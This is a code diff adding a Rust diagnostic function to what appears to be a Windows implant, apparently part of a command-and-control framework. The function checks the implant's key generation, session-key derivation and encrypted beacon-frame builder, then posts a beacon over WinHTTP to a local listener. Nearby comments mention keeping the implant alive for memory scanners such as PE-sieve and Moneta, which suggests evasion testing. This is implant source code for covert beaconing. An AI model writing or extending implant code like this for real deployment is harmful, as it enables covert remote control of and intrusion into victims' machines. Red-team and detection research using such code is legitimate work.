@@ -660,6 +660,58 @@ pub unsafe extern "system" fn nyx_selftest_calib42() {
     unsafe { exit(42) };
 }
 
+/// Diagnostic: test CSPRNG + X25519 keygen + session_key in isolation.
+/// Exit codes:
+///   0xA0 = CSPRNG fill OK (non-zero)
+///   0xA1 = ImplantKeypair::generate OK (curve25519 scalar mult works)
+///   0xA2 = session_key (HKDF) OK
+///   0xAF = csprng_fill returned false
+///   0xAE = fill returned all-zeros
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_csprng() {
+    use nyx_protocol::{ImplantKeypair, crypto};
+
+    // Step 1: Register + test CSPRNG fill.
+    crypto::register_csprng(crate::entry::csprng_fill);
+    let mut buf = [0u8; 32];
+    if !crate::entry::csprng_fill(&mut buf) {
+        unsafe { exit(0xAF) };
+    }
+    if buf.iter().all(|&b| b == 0) {
+        unsafe { exit(0xAE) };
+    }
+    // 0xA0 reached: CSPRNG OK
+
+    // Step 2: Test X25519 keygen (the curve25519 scalar mult).
+    let kp = ImplantKeypair::generate();
+    let _pub = kp.public_bytes();
+    // 0xA1 reached: keygen OK
+
+    // Step 3: Test session_key (HKDF + ECDH with a dummy pubkey).
+    let key = kp.session_key(&[0x42u8; 32]);
+    // 0xA2 reached: session_key OK
+
+    // Step 4: Test mem::register_key + encode_frame (the beacon frame builder).
+    crate::mem::register_key(key);
+    let pubkey = kp.public_bytes();
+    let frame = nyx_protocol::encode_frame(&pubkey, 0u64, &key, b"test_info");
+    // 0xA3 reached: encode_frame OK
+
+    // Step 5: Test ensure_winhttp only (resolve WinHTTP fns — no network call).
+    crate::transport::ensure_winhttp();
+    // 0xA5 reached: winhttp fns resolved OK
+
+    // Step 6: Test post_frame (actual WinHTTP call — WinHttpOpen etc.)
+    let _resp = crate::transport::post_frame(
+        b"127.0.0.1",
+        8443u16,
+        b"/beacon",
+        &frame,
+        false,
+    );
+    unsafe { exit(0xA6) }; // post_frame returned (even if None)
+}
+
 // ============================================================================
 // nyx_linger: keep the implant alive + fully initialized for ~30s so an
 // external memory scanner (PE-sieve / Moneta) can attach and inspect the
